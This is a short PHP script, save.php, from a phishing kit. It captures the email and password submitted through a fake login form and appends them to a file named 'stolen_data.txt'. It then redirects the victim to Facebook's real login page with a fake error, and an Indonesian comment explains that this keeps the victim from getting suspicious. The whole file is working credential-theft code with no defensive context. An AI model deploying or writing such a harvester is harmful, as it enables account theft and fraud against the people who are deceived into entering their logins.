<!-- save.php -->
<?php
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';

if(!empty($email) && !empty($password)) {
    $log = "[" . date('Y-m-d H:i:s') . "] EMAIL: $email | PASS: $password" . PHP_EOL;
    file_put_contents("stolen_data.txt", $log, FILE_APPEND);
    // redirect ke situs asli (misal facebook.com) agar korban tidak curiga
    header("Location: https://facebook.com/login.php?login_attempt=1&error=invalid");
    exit();
}
header("Location: index.html?error=1");
exit();
?>